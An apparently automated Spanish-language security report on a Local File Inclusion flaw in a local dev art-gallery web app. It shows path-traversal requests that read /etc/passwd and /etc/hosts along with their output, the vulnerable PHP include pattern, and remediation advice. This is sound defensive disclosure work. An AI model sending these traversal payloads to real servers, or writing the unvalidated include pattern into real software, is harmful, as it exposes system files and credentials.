# Informe de Análisis de Seguridad - Local File Inclusion (LFI)

**Fecha:** 2026-04-30 16:03:06  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Local File Inclusion (LFI)  
**Resultado:** VULNERABILIDAD ENCONTRADA Y EXPLOTADA

---

## 1. Resumen Ejecutivo

Se ha identificado y explotado una vulnerabilidad de tipo **Local File Inclusion (LFI)** en la aplicación web "Galería de Arte Virtual" alojada en `http://web.dev.local:8081`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de ficheros del servidor mediante la manipulación del parámetro `page` en el fichero `gallery.php`.

---

## 2. Descripción de la Vulnerabilidad

| Campo | Detalle |
|-------|---------|
| **Tipo** | Local File Inclusion (LFI) |
| **Severidad** | Alta |
| **CVSS (estimado)** | 7.5 (Alto) |
| **URL afectada** | `http://web.dev.local:8081/gallery.php` |
| **Parámetro vulnerable** | `page` |
| **Método** | GET |

### Descripción Técnica

El parámetro `page` del fichero `gallery.php` acepta rutas de archivo sin validar ni sanitizar correctamente. El servidor incluye dinámicamente el fichero indicado en dicho parámetro, lo que permite a un atacante utilizar secuencias de path traversal (`../`) para acceder a ficheros fuera del directorio web raíz.

---

## 3. Pruebas de Concepto (PoC)

### 3.1 Lectura de `/etc/passwd`

**Petición:**
```
GET http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### 3.2 Lectura de `/etc/hosts`

**Petición:**
```
GET http://web.dev.local:8081/gallery.php?page=../../../etc/hosts
```

**Resultado:**
```
127.0.0.1   localhost
::1         localhost ip6-localhost ip6-loopback
fe00::      ip6-localnet
ff00::      ip6-mcastprefix
ff02::1     ip6-allnodes
ff02::2     ip6-allrouters
172.19.0.2  d5054e367753
```

---

## 4. Impacto

- **Divulgación de información sensible:** Un atacante puede leer ficheros del sistema como `/etc/passwd`, `/etc/hosts`, ficheros de configuración, claves privadas, etc.
- **Enumeración de usuarios del sistema:** El fichero `/etc/passwd` expone todos los usuarios del servidor.
- **Posible escalada a RCE:** En combinación con técnicas como Log Poisoning o inclusión de ficheros de sesión PHP, el LFI podría derivar en ejecución remota de código (RCE).
- **Exposición de credenciales:** Ficheros de configuración de bases de datos u otras aplicaciones podrían estar accesibles.

---

## 5. Causa Raíz

La vulnerabilidad se origina porque el código PHP en `gallery.php` incluye directamente el valor del parámetro `page` sin:
- Validar que el valor sea uno de los valores permitidos (whitelist).
- Sanitizar o neutralizar secuencias de path traversal (`../`).
- Restringir el acceso al directorio de páginas de la aplicación.

Ejemplo del patrón vulnerable:
```php
include($_GET['page'] . '.php');  // Sin validación
// o incluso:
include($_GET['page']);           // Sin extensión forzada
```

---

## 6. Recomendaciones

1. **Implementar una lista blanca (whitelist):** Validar que el valor de `page` sea únicamente uno de los valores permitidos (ej: `modern`, `classic`, `abstract`, `about`).

```php
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
if (in_array($_GET['page'], $allowed_pages)) {
    include('pages/' . $_GET['page'] . '.php');
} else {
    // mostrar error o página por defecto
}
```

2. **No usar entrada del usuario directamente en `include/require`:** Evitar el uso de parámetros controlados por el usuario en funciones de inclusión de ficheros.

3. **Configurar `open_basedir` en PHP:** Restringir los directorios a los que PHP puede acceder mediante la directiva `open_basedir` en `php.ini`.

4. **Desactivar `allow_url_include`:** Asegurarse de que esta directiva esté desactivada para prevenir Remote File Inclusion (RFI).

5. **Aplicar principio de mínimo privilegio:** El proceso del servidor web debe ejecutarse con los mínimos permisos necesarios.

---

## 7. Conclusión

La aplicación "Galería de Arte Virtual" presenta una vulnerabilidad crítica de tipo LFI en el parámetro `page` de `gallery.php`. La explotación exitosa ha permitido leer ficheros sensibles del sistema como `/etc/passwd` y `/etc/hosts`. Se recomienda aplicar las medidas correctivas descritas de forma inmediata para mitigar el riesgo.

---

*Informe generado automáticamente por análisis de seguridad automatizado.*
